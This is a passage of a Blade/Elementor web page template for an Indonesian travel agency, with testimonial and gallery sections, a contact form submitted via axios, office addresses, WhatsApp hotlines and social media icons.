elementor-element-populated">
<div id="testimon" class="elementor-element elementor-element-db4095a elementor-widget elementor-widget-heading" data-id="db4095a" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default"><span style="background: linear-gradient(90deg, #6B5E56 20%, #8B7E74 50%); -webkit-background-clip: text;  -webkit-text-fill-color: transparent;"> Testimoni</span></h2></div></div>
<div class="elementor-element elementor-element-70b08ca elementor-widget elementor-widget-video" data-id="70b08ca" data-element_type="widget" data-settings="{&quot;youtube_url&quot;:&quot;https:\/\/www.youtube.com\/watch?v=aiphYl0WX1g&quot;,&quot;video_type&quot;:&quot;youtube&quot;,&quot;controls&quot;:&quot;yes&quot;}" data-widget_type="video.default"><div class="elementor-widget-container"><div class="elementor-wrapper elementor-open-inline"><div class="elementor-video"></div></div></div></div>
</div></div></div></section></div></div></div></section><div id="galerie" class="elementor-element elementor-element-a00e468 e-flex e-con-boxed e-con" data-id="a00e468" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-150640e elementor-widget elementor-widget-heading" data-id="150640e" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default"><span style="background: linear-gradient(90deg, #6B5E56 20%, #8B7E74 50%); -webkit-background-clip: text;  -webkit-text-fill-color: transparent;"> Galeri</span></h2></div></div>
<div class="elementor-element elementor-element-571206f elementor-widget elementor-widget-gallery" data-id="571206f" data-element_type="widget" data-settings="{&quot;gallery_layout&quot;:&quot;masonry&quot;,&quot;columns_mobile&quot;:2,&quot;lazyload&quot;:&quot;yes&quot;,&quot;columns&quot;:4,&quot;columns_tablet&quot;:2,&quot;gap&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:10,&quot;sizes&quot;:[]},&quot;gap_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:10,&quot;sizes&quot;:[]},&quot;gap_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:10,&quot;sizes&quot;:[]},&quot;link_to&quot;:&quot;file&quot;,&quot;overlay_background&quot;:&quot;yes&quot;,&quot;content_hover_animation&quot;:&quot;fade-in&quot;}" data-widget_type="gallery.default"><div class="elementor-widget-container"><div class="elementor-gallery__container">
<a class="e-gallery-item elementor-gallery-item elementor-animated-content" href="{{ asset('/wp-content/uploads/2023/10/WhatsApp-Image-2023-01-24-at-4.34.46-PM.jpeg') }}" data-elementor-open-lightbox="yes" data-elementor-lightbox-slideshow="all-571206f" data-elementor-lightbox-title="WhatsApp Image 2023-01-24 at 4.34.46 PM" data-e-action-hash="#elementor-action%3Aaction%3Dlightbox%26settings%3DeyJpZCI6MTM1OCwidXJsIjoiaHR0cHM6XC9cL2FybWVjYXdlYmRldi5teS5pZFwvd3AtY29udGVudFwvdXBsb2Fkc1wvMjAyM1wvMTBcL1doYXRzQXBwLUltYWdlLTIwMjMtMDEtMjQtYXQtNC4zNC40Ni1QTS5qcGVnIiwic2xpZGVzaG93IjoiYWxsLTU3MTIwNmYifQ%3D%3D"><div class="e-gallery-image elementor-gallery-item__image" data-thumbnail="{{ asset('/wp-content/uploads/2023/10/WhatsApp-Image-2023-01-24-at-4.34.46-PM-225x300.jpeg') }}" data-width="225" data-height="300" aria-label="" role="img"></div>
<div class="elementor-gallery-item__overlay"></div>
</a>
<a class="e-gallery-item elementor-gallery-item elementor-animated-content" href="{{ asset('/wp-content/uploads/2023/10/WhatsApp-Image-2023-01-26-at-7.09.49-PM.jpeg') }}" data-elementor-open-lightbox="yes" data-elementor-lightbox-slideshow="all-571206f" data-elementor-lightbox-title="WhatsApp Image 2023-01-26 at 7.09.49 PM" data-e-action-hash="#elementor-action%3Aaction%3Dlightbox%26settings%3DeyJpZCI6MTM2MCwidXJsIjoiaHR0cHM6XC9cL2FybWVjYXdlYmRldi5teS5pZFwvd3AtY29udGVudFwvdXBsb2Fkc1wvMjAyM1wvMTBcL1doYXRzQXBwLUltYWdlLTIwMjMtMDEtMjYtYXQtNy4wOS40OS1QTS5qcGVnIiwic2xpZGVzaG93IjoiYWxsLTU3MTIwNmYifQ%3D%3D"><div class="e-gallery-image elementor-gallery-item__image" data-thumbnail="{{ asset('/wp-content/uploads/2023/10/WhatsApp-Image-2023-01-26-at-7.09.49-PM-300x169.jpeg') }}" data-width="300" data-height="169" aria-label="" role="img"></div>
<div class="elementor-gallery-item__overlay"></div>
</a>
<a class="e-gallery-item elementor-gallery-item elementor-animated-content" href="{{ asset('/wp-content/uploads/2023/10/WhatsApp-Image-2023-01-22-at-5.16.02-PM.jpeg') }}" data-elementor-open-lightbox="yes" data-elementor-lightbox-slideshow="all-571206f" data-elementor-lightbox-title="WhatsApp Image 2023-01-22 at 5.16.02 PM" data-e-action-hash="#elementor-action%3Aaction%3Dlightbox%26settings%3DeyJpZCI6MTM2MSwidXJsIjoiaHR0cHM6XC9cL2FybWVjYXdlYmRldi5teS5pZFwvd3AtY29udGVudFwvdXBsb2Fkc1wvMjAyM1wvMTBcL1doYXRzQXBwLUltYWdlLTIwMjMtMDEtMjItYXQtNS4xNi4wMi1QTS5qcGVnIiwic2xpZGVzaG93IjoiYWxsLTU3MTIwNmYifQ%3D%3D"><div class="e-gallery-image elementor-gallery-item__image" data-thumbnail="{{ asset('/wp-content/uploads/2023/10/WhatsApp-Image-2023-01-22-at-5.16.02-PM-169x300.jpeg') }}" data-width="169" data-height="300" aria-label="" role="img"></div>
<div class="elementor-gallery-item__overlay"></div>
</a>
<a class="e-gallery-item elementor-gallery-item elementor-animated-content" href="{{ asset('/wp-content/uploads/2023/10/WhatsApp-Image-2023-01-09-at-1.11.08-PM.jpeg') }}" data-elementor-open-lightbox="yes" data-elementor-lightbox-slideshow="all-571206f" data-elementor-lightbox-title="WhatsApp Image 2023-01-09 at 1.11.08 PM" data-e-action-hash="#elementor-action%3Aaction%3Dlightbox%26settings%3DeyJpZCI6MTM2MiwidXJsIjoiaHR0cHM6XC9cL2FybWVjYXdlYmRldi5teS5pZFwvd3AtY29udGVudFwvdXBsb2Fkc1wvMjAyM1wvMTBcL1doYXRzQXBwLUltYWdlLTIwMjMtMDEtMDktYXQtMS4xMS4wOC1QTS5qcGVnIiwic2xpZGVzaG93IjoiYWxsLTU3MTIwNmYifQ%3D%3D"><div class="e-gallery-image elementor-gallery-item__image" data-thumbnail="{{ asset('/wp-content/uploads/2023/10/WhatsApp-Image-2023-01-09-at-1.11.08-PM-225x300.jpeg') }}" data-width="225" data-height="300" aria-label="" role="img"></div>
<div class="elementor-gallery-item__overlay"></div>
</a>
<a class="e-gallery-item elementor-gallery-item elementor-animated-content" href="{{ asset('/wp-content/uploads/2023/10/WhatsApp-Image-2023-04-20-at-23.37.35.jpeg') }}" data-elementor-open-lightbox="yes" data-elementor-lightbox-slideshow="all-571206f" data-elementor-lightbox-title="WhatsApp Image 2023-04-20 at 23.37.35" data-e-action-hash="#elementor-action%3Aaction%3Dlightbox%26settings%3DeyJpZCI6MTM2MywidXJsIjoiaHR0cHM6XC9cL2FybWVjYXdlYmRldi5teS5pZFwvd3AtY29udGVudFwvdXBsb2Fkc1wvMjAyM1wvMTBcL1doYXRzQXBwLUltYWdlLTIwMjMtMDQtMjAtYXQtMjMuMzcuMzUuanBlZyIsInNsaWRlc2hvdyI6ImFsbC01NzEyMDZmIn0%3D"><div class="e-gallery-image elementor-gallery-item__image" data-thumbnail="{{ asset('/wp-content/uploads/2023/10/WhatsApp-Image-2023-04-20-at-23.37.35-174x300.jpeg') }}" data-width="174" data-height="300" aria-label="" role="img"></div>
<div class="elementor-gallery-item__overlay"></div>
</a>
<a class="e-gallery-item elementor-gallery-item elementor-animated-content" href="{{ asset('/wp-content/uploads/2023/10/WhatsApp-Image-2023-04-19-at-09.37.24-1.jpeg') }}" data-elementor-open-lightbox="yes" data-elementor-lightbox-slideshow="all-571206f" data-elementor-lightbox-title="WhatsApp Image 2023-04-19 at 09.37.24" data-e-action-hash="#elementor-action%3Aaction%3Dlightbox%26settings%3DeyJpZCI6MTM2NCwidXJsIjoiaHR0cHM6XC9cL2FybWVjYXdlYmRldi5teS5pZFwvd3AtY29udGVudFwvdXBsb2Fkc1wvMjAyM1wvMTBcL1doYXRzQXBwLUltYWdlLTIwMjMtMDQtMTktYXQtMDkuMzcuMjQtMS5qcGVnIiwic2xpZGVzaG93IjoiYWxsLTU3MTIwNmYifQ%3D%3D"><div class="e-gallery-image elementor-gallery-item__image" data-thumbnail="{{ asset('/wp-content/uploads/2023/10/WhatsApp-Image-2023-04-19-at-09.37.24-1-225x300.jpeg') }}" data-width="225" data-height="300" aria-label="" role="img"></div>
<div class="elementor-gallery-item__overlay"></div>
</a>
<a class="e-gallery-item elementor-gallery-item elementor-animated-content" href="{{ asset('/wp-content/uploads/2023/10/WhatsApp-Image-2023-04-15-at-13.37.52.jpeg') }}" data-elementor-open-lightbox="yes" data-elementor-lightbox-slideshow="all-571206f" data-elementor-lightbox-title="WhatsApp Image 2023-04-15 at 13.37.52" data-e-action-hash="#elementor-action%3Aaction%3Dlightbox%26settings%3DeyJpZCI6MTM2NSwidXJsIjoiaHR0cHM6XC9cL2FybWVjYXdlYmRldi5teS5pZFwvd3AtY29udGVudFwvdXBsb2Fkc1wvMjAyM1wvMTBcL1doYXRzQXBwLUltYWdlLTIwMjMtMDQtMTUtYXQtMTMuMzcuNTIuanBlZyIsInNsaWRlc2hvdyI6ImFsbC01NzEyMDZmIn0%3D"><div class="e-gallery-image elementor-gallery-item__image" data-thumbnail="{{ asset('/wp-content/uploads/2023/10/WhatsApp-Image-2023-04-15-at-13.37.52-225x300.jpeg') }}" data-width="225" data-height="300" aria-label="" role="img"></div>
<div class="elementor-gallery-item__overlay"></div>
</a>
<a class="e-gallery-item elementor-gallery-item elementor-animated-content" href="{{ asset('/wp-content/uploads/2023/10/WhatsApp-Image-2023-04-10-at-19.30.13.jpeg') }}" data-elementor-open-lightbox="yes" data-elementor-lightbox-slideshow="all-571206f" data-elementor-lightbox-title="WhatsApp Image 2023-04-10 at 19.30.13" data-e-action-hash="#elementor-action%3Aaction%3Dlightbox%26settings%3DeyJpZCI6MTM2NiwidXJsIjoiaHR0cHM6XC9cL2FybWVjYXdlYmRldi5teS5pZFwvd3AtY29udGVudFwvdXBsb2Fkc1wvMjAyM1wvMTBcL1doYXRzQXBwLUltYWdlLTIwMjMtMDQtMTAtYXQtMTkuMzAuMTMuanBlZyIsInNsaWRlc2hvdyI6ImFsbC01NzEyMDZmIn0%3D"><div class="e-gallery-image elementor-gallery-item__image" data-thumbnail="{{ asset('/wp-content/uploads/2023/10/WhatsApp-Image-2023-04-10-at-19.30.13-300x225.jpeg') }}" data-width="300" data-height="225" aria-label="" role="img"></div>
<div class="elementor-gallery-item__overlay"></div>
</a>
</div></div></div>
</div></div>
<div class="elementor-element elementor-element-4fded9d e-con-full e-flex e-con" data-id="4fded9d" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;full&quot;}"><div class="elementor-element elementor-element-59007a2 e-flex e-con-boxed e-con" data-id="59007a2" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;content_width&quot;:&quot;boxed&quot;}">
<div class="e-con-inner">
<div class="elementor-element elementor-element-4d4c362 e-flex e-con-boxed e-con" data-id="4d4c362" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner"><div class="elementor-element elementor-element-20d6286 e-con-full e-flex e-con" data-id="20d6286" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;full&quot;}">
<div class="elementor-element elementor-element-3a0c04a elementor-widget elementor-widget-heading" data-id="3a0c04a" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Dapatkan penawaran menarik lainnya</h2></div></div>
<div class="elementor-element elementor-element-0ec0ca2 elementor-widget elementor-widget-heading" data-id="0ec0ca2" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Isi form dibawah ini</h2></div></div>
<div class="elementor-element elementor-element-7276065 elementor-button-align-stretch elementor-widget elementor-widget-form" data-id="7276065" data-element_type="widget" data-settings="{&quot;step_next_label&quot;:&quot;Next&quot;,&quot;step_previous_label&quot;:&quot;Previous&quot;,&quot;button_width&quot;:&quot;100&quot;,&quot;step_type&quot;:&quot;number_text&quot;,&quot;step_icon_shape&quot;:&quot;circle&quot;}" data-widget_type="form.default"><div class="elementor-widget-container">
    <form id="penawaranUserForm" class="elementor-form" method="post" name="Form Penawaran" onsubmit="return false;">
        @csrf
<input type="hidden" name="post_id" value="7">
<input type="hidden" name="form_id" value="7276065">
<input type="hidden" name="referer_title" value="Home - My Blog"><input type="hidden" name="queried_id" value="7"><div class="elementor-form-fields-wrapper elementor-labels-">
<div class="elementor-field-type-text elementor-field-group elementor-column elementor-field-group-name elementor-col-100">
<label for="form-field-name" class="elementor-field-label elementor-screen-only">
Name							</label>
<input size="1" type="text" name="nama" id="form-field-name" class="elementor-field elementor-size-sm  elementor-field-textual" placeholder="Name">
</div>
<div class="elementor-field-type-email elementor-field-group elementor-column elementor-field-group-email elementor-col-100 elementor-field-required">
<label for="form-field-email" class="elementor-field-label elementor-screen-only">
Email							</label>
<input size="1" type="email" name="email" id="form-field-email" class="elementor-field elementor-size-sm  elementor-field-textual" placeholder="Email" required="required" aria-required="true">
</div>
<div class="elementor-field-type-tel elementor-field-group elementor-column elementor-field-group-field_d7f01db elementor-col-100 elementor-field-required">
<label for="form-field-field_d7f01db" class="elementor-field-label elementor-screen-only">
Nomor HP							</label>
<input size="1" type="tel" name="nomor_hp" id="form-field-field_d7f01db" class="elementor-field elementor-size-sm  elementor-field-textual" placeholder="Nomor HP" required="required" aria-required="true" pattern="[0-9()#&amp;+*-=.]+" title="Only numbers and phone characters (#, -, *, etc) are accepted.">
</div>
<div class="elementor-field-type-textarea elementor-field-group elementor-column elementor-field-group-message elementor-col-100">
<label for="form-field-message" class="elementor-field-label elementor-screen-only">
Pesan							</label>
<textarea class="elementor-field-textual elementor-field  elementor-size-sm" name="pesan" id="form-field-message" rows="4" placeholder="Tuliskan Pesan "></textarea>
</div>
<div class="elementor-field-group elementor-column elementor-field-type-submit elementor-col-100 e-form__buttons">
<button id="input_penawaran" type="submit" class="elementor-button elementor-size-sm" onclick="sikat_tawar()">
<span>
<span class=" elementor-button-icon">
</span>
<span class="elementor-button-text">Kirim</span>
</span>
</button>
</div>
</div>
</form>

<div id="successModal" class="modal fade" tabindex="-1" role="dialog">
    <div class="modal-dialog modal-dialog-centered" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Berhasil Input</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <p>Data berhasil ditambahkan ke database.</p>
            </div>
            <div class="modal-footer">
                <button type="button" id="closeSuccessModal" class="btn btn-primary" data-dismiss="modal">Tutup</button>
            </div>
        </div>
    </div>
</div>





<script>
    const form = document.getElementById('penawaranUserForm');
    const submitBtn = document.getElementById('input_penawaran');

    submitBtn.addEventListener('click', () => {
        axios.post('{{ route('penawaran_user') }}', {
            nama: form.nama.value,
            email: form.email.value,
            nomor_hp: form.nomor_hp.value,
            pesan: form.pesan.value,
        })
        .then(() => {
            form.reset();
            alert('Data berhasil ditambahkan ke database.'); // Tampilkan pesan alert
        })
        .catch(error => {
            console.log(error);
        });
    });
</script>





</div></div>
</div></div></div>
<div class="elementor-element elementor-element-dd751d7 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="dd751d7" data-element_type="widget" data-widget_type="divider.default"><div class="elementor-widget-container"><div class="elementor-divider">
<span class="elementor-divider-separator">
</span>
</div></div></div>
<div class="elementor-element elementor-element-36c6390 e-flex e-con-boxed e-con" data-id="36c6390" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-4755e55 e-flex e-con-boxed e-con" data-id="4755e55" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-ea05013 elementor-widget elementor-widget-image" data-id="ea05013" data-element_type="widget" data-widget_type="image.default"><div class="elementor-widget-container">
<img data-lazyloaded="1" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMDAiIGhlaWdodD0iODciIHZpZXdCb3g9IjAgMCAzMDAgODciPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIHN0eWxlPSJmaWxsOiNjZmQ0ZGI7ZmlsbC1vcGFjaXR5OiAwLjE7Ii8+PC9zdmc+" decoding="async" width="300" height="87" data-src="{{ asset('/wp-content/uploads/2023/09/focus-logo-rec-normal-300x87.png') }}" class="attachment-medium size-medium wp-image-1089" alt="" data-srcset="{{ asset('/wp-content/uploads/2023/09/focus-logo-rec-normal-300x87.png') }} 300w, {{ asset('/wp-content/uploads/2023/09/focus-logo-rec-normal-1024x296.png') }} 1024w, {{ asset('/wp-content/uploads/2023/09/focus-logo-rec-normal-768x222.png') }} 768w, {{ asset('/wp-content/uploads/2023/09/focus-logo-rec-normal-1536x444.png') }} 1536w, {{ asset('/wp-content/uploads/2023/09/focus-logo-rec-normal-2048x592.png') }} 2048w" data-sizes="(max-width: 300px) 100vw, 300px">
</div></div>
<div class="elementor-element elementor-element-e16efc9 elementor-widget elementor-widget-text-editor" data-id="e16efc9" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container"><p>PT. Focus Akhirat Kita</p></div></div>
<div class="elementor-element elementor-element-67c584d elementor-mobile-align-center elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="67c584d" data-element_type="widget" data-widget_type="icon-list.default"><div class="elementor-widget-container"><ul class="elementor-icon-list-items">
<li class="elementor-icon-list-item">
<span class="elementor-icon-list-text">Tentang Focus</span>
</li>
<li class="elementor-icon-list-item">
<span class="elementor-icon-list-text">Layanan Focus</span>
</li>
<li class="elementor-icon-list-item">
<span class="elementor-icon-list-text">Mengapa Focus</span>
</li>
<li class="elementor-icon-list-item">
<span class="elementor-icon-list-text">Testimoni</span>
</li>
<li class="elementor-icon-list-item">
<a href="http://Program-program%20Puass"><span class="elementor-icon-list-text">Galeri</span>
</a>
</li>
</ul></div></div>
</div></div>
<div class="elementor-element elementor-element-abfffa5 e-flex e-con-boxed e-con" data-id="abfffa5" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-aecbb06 e-flex e-con-boxed e-con" data-id="aecbb06" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-9cb2a09 elementor-widget elementor-widget-heading" data-id="9cb2a09" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Kantor Batang</h2></div></div>
<div class="elementor-element elementor-element-596246d elementor-widget elementor-widget-heading" data-id="596246d" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Jalan Blado - Pagilaran, Batang, Jawa Tengah 51255</h2></div></div>
</div></div>
<div class="elementor-element elementor-element-656fb75 e-flex e-con-boxed e-con" data-id="656fb75" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-e63b645 elementor-widget elementor-widget-heading" data-id="e63b645" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Kantor Pati</h2></div></div>
<div class="elementor-element elementor-element-7e4d3bf elementor-widget elementor-widget-heading" data-id="7e4d3bf" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Karaban 04/05, Gabus, Pati, Jawa Tengah 59173</h2></div></div>
</div></div>
<div class="elementor-element elementor-element-d7bcec2 e-flex e-con-boxed e-con" data-id="d7bcec2" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-40543d9 elementor-widget elementor-widget-heading" data-id="40543d9" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Kantor Malang</h2></div></div>
<div class="elementor-element elementor-element-82a6722 elementor-widget elementor-widget-heading" data-id="82a6722" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Jalan Soekarno Hatta, Kota Malang, Jawa Timur 65142</h2></div></div>
</div></div>
</div></div>
<div class="elementor-element elementor-element-70a6a36 e-flex e-con-boxed e-con" data-id="70a6a36" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-5a8c4d5 e-flex e-con-boxed e-con" data-id="5a8c4d5" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-ed20d78 elementor-widget elementor-widget-heading" data-id="ed20d78" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Hotline</h2></div></div>
<div class="elementor-element elementor-element-ab6a572 e-flex e-con-boxed e-con" data-id="ab6a572" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner"><div class="elementor-element elementor-element-ef9dc18 elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="ef9dc18" data-element_type="widget" data-widget_type="icon-list.default"><div class="elementor-widget-container"><ul class="elementor-icon-list-items">
<li class="elementor-icon-list-item">
<a href="https://api.whatsapp.com/send/?phone=6287731665417&#038;text&#038;type=phone_number&#038;app_absent=0"><span class="elementor-icon-list-icon">
<i aria-hidden="true" class="fab fa-whatsapp"></i>						</span>
<span class="elementor-icon-list-text">+62 877 3166 5417 (Indonesia)</span>
</a>
</li>
<li class="elementor-icon-list-item">
<a href="https://api.whatsapp.com/send/?phone=6285327657002&#038;text&#038;type=phone_number&#038;app_absent=0"><span class="elementor-icon-list-icon">
<i aria-hidden="true" class="fab fa-whatsapp"></i>						</span>
<span class="elementor-icon-list-text">+62 853 2765 7002 (Indonesia)</span>
</a>
</li>
<li class="elementor-icon-list-item">
<a href="https://api.whatsapp.com/send/?phone=966509927070&#038;text&#038;type=phone_number&#038;app_absent=0"><span class="elementor-icon-list-icon">
<i aria-hidden="true" class="fab fa-whatsapp"></i>						</span>
<span class="elementor-icon-list-text">+966 50 992 7070 (Saudi)</span>
</a>
</li>
<li class="elementor-icon-list-item">
<a href="https://api.whatsapp.com/send/?phone=966549927070&#038;text&#038;type=phone_number&#038;app_absent=0"><span class="elementor-icon-list-icon">
<i aria-hidden="true" class="fab fa-whatsapp"></i>						</span>
<span id="hubungi" class="elementor-icon-list-text">+966 54 992 7070 (Saudi)</span>
</a>
</li>
</ul></div></div></div></div>
</div></div>
<div class="elementor-element elementor-element-9f7a15b e-flex e-con-boxed e-con" data-id="9f7a15b" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-78397c1 elementor-widget elementor-widget-heading" data-id="78397c1" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Ikuti Kami</h2></div></div>
<div class="elementor-element elementor-element-9c0042f elementor-grid-4 e-grid-align-left e-grid-align-mobile-center elementor-widget__width-initial elementor-shape-rounded elementor-widget elementor-widget-social-icons" data-id="9c0042f" data-element_type="widget" data-widget_type="social-icons.default"><div class="elementor-widget-container"><div class="elementor-social-icons-wrapper elementor-grid">
<span class="elementor-grid-item">
<a class="elementor-icon elementor-social-icon elementor-social-icon- elementor-animation-grow elementor-repeater-item-b758758" target="_blank" href="./home.html">
<span class="elementor-screen-only"></span>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="800px" height="800px" viewbox="-5 0 20 20" fill="#000000"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><title>facebook [#176]</title>
<desc>Created with Sketch.</desc><defs> </defs><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="Dribbble-Light-Preview" transform="translate(-385.000000, -7399.000000)" fill="#FFBF45"><g id="icons" transform="translate(56.000000, 160.000000)"><path d="M335.821282,7259 L335.821282,7250 L338.553693,7250 L339,7246 L335.821282,7246 L335.821282,7244.052 C335.821282,7243.022 335.847593,7242 337.286884,7242 L338.744689,7242 L338.744689,7239.14 C338.744689,7239.097 337.492497,7239 336.225687,7239 C333.580004,7239 331.923407,7240.657 331.923407,7243.7 L331.923407,7246 L329,7246 L329,7250 L331.923407,7250 L331.923407,7259 L335.821282,7259 Z" id="facebook-[#176]"> </path></g></g></g></g></svg>					</a>
</span>
<span class="elementor-grid-item">
<a class="elementor-icon elementor-social-icon elementor-social-icon- elementor-animation-grow elementor-repeater-item-2717971" href="https://www.tiktok.com/@focustravelers.id?is_from_webapp=1&#038;sender_device=pc" target="_blank">
<span class="elementor-screen-only"></span>
<svg xmlns="http://www.w3.org/2000/svg" fill="#FFBF45" width="800px" height="800px" viewbox="0 0 32 32"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><title>tiktok</title>
<path d="M16.656 1.029c1.637-0.025 3.262-0.012 4.886-0.025 0.054 2.031 0.878 3.859 2.189 5.213l-0.002-0.002c1.411 1.271 3.247 2.095 5.271 2.235l0.028 0.002v5.036c-1.912-0.048-3.71-0.489-5.331-1.247l0.082 0.034c-0.784-0.377-1.447-0.764-2.077-1.196l0.052 0.034c-0.012 3.649 0.012 7.298-0.025 10.934-0.103 1.853-0.719 3.543-1.707 4.954l0.020-0.031c-1.652 2.366-4.328 3.919-7.371 4.011l-0.014 0c-0.123 0.006-0.268 0.009-0.414 0.009-1.73 0-3.347-0.482-4.725-1.319l0.040 0.023c-2.508-1.509-4.238-4.091-4.558-7.094l-0.004-0.041c-0.025-0.625-0.037-1.25-0.012-1.862 0.49-4.779 4.494-8.476 9.361-8.476 0.547 0 1.083 0.047 1.604 0.136l-0.056-0.008c0.025 1.849-0.050 3.699-0.050 5.548-0.423-0.153-0.911-0.242-1.42-0.242-1.868 0-3.457 1.194-4.045 2.861l-0.009 0.030c-0.133 0.427-0.21 0.918-0.21 1.426 0 0.206 0.013 0.41 0.037 0.61l-0.002-0.024c0.332 2.046 2.086 3.59 4.201 3.59 0.061 0 0.121-0.001 0.181-0.004l-0.009 0c1.463-0.044 2.733-0.831 3.451-1.994l0.010-0.018c0.267-0.372 0.45-0.822 0.511-1.311l0.001-0.014c0.125-2.237 0.075-4.461 0.087-6.698 0.012-5.036-0.012-10.060 0.025-15.083z"></path></g></svg>					</a>
</span>
<span class="elementor-grid-item">
<a class="elementor-icon elementor-social-icon elementor-social-icon- elementor-animation-grow elementor-repeater-item-48fae7b" href="https://www.instagram.com/focustravelers.id/" target="_blank">
<span class="elementor-screen-only"></span>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="800px" height="800px" viewbox="0 0 20 20" fill="#FFBF45"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><title>instagram [#167]</title>
<desc>Created with Sketch.</desc><defs> </defs><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="Dribbble-Light-Preview" transform="translate(-340.000000, -7439.000000)" fill="#FFBF45"><g id="icons" transform="translate(56.000000, 160.000000)"><path d="M289.869652,7279.12273 C288.241769,7279.19618 286.830805,7279.5942 285.691486,7280.72871 C284.548187,7281.86918 284.155147,7283.28558 284.081514,7284.89653 C284.035742,7285.90201 283.768077,7293.49818 284.544207,7295.49028 C285.067597,7296.83422 286.098457,7297.86749 287.454694,7298.39256 C288.087538,7298.63872 288.809936,7298.80547 289.869652,7298.85411 C298.730467,7299.25511 302.015089,7299.03674 303.400182,7295.49028 C303.645956,7294.859 303.815113,7294.1374 303.86188,7293.08031 C304.26686,7284.19677 303.796207,7282.27117 302.251908,7280.72871 C301.027016,7279.50685 299.5862,7278.67508 289.869652,7279.12273 M289.951245,7297.06748 C288.981083,7297.0238 288.454707,7296.86201 288.103459,7296.72603 C287.219865,7296.3826 286.556174,7295.72155 286.214876,7294.84312 C285.623823,7293.32944 285.819846,7286.14023 285.872583,7284.97693 C285.924325,7283.83745 286.155174,7282.79624 286.959165,7281.99226 C287.954203,7280.99968 289.239792,7280.51332 297.993144,7280.90837 C299.135448,7280.95998 300.179243,7281.19026 300.985224,7281.99226 C301.980262,7282.98483 302.473801,7284.28014 302.071806,7292.99991 C302.028024,7293.96767 301.865833,7294.49274 301.729513,7294.84312 C300.829003,7297.15085 298.757333,7297.47145 289.951245,7297.06748 M298.089663,7283.68956 C298.089663,7284.34665 298.623998,7284.88065 299.283709,7284.88065 C299.943419,7284.88065 300.47875,7284.34665 